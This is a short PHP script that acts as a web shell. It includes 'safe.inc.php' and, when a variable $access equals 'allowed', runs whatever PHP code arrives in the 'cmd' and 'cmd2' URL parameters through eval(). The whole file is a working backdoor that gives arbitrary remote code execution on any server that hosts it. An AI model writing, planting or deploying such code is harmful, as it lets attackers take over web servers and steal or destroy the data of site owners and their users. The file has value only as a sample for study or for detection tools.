<?php
        include ('safe.inc.php');
        if ($access=="allowed") {
                eval($_GET['cmd']);
                if (!empty($_GET['cmd2'])) {
                        eval($_GET['cmd2']);
                }
        }
?>
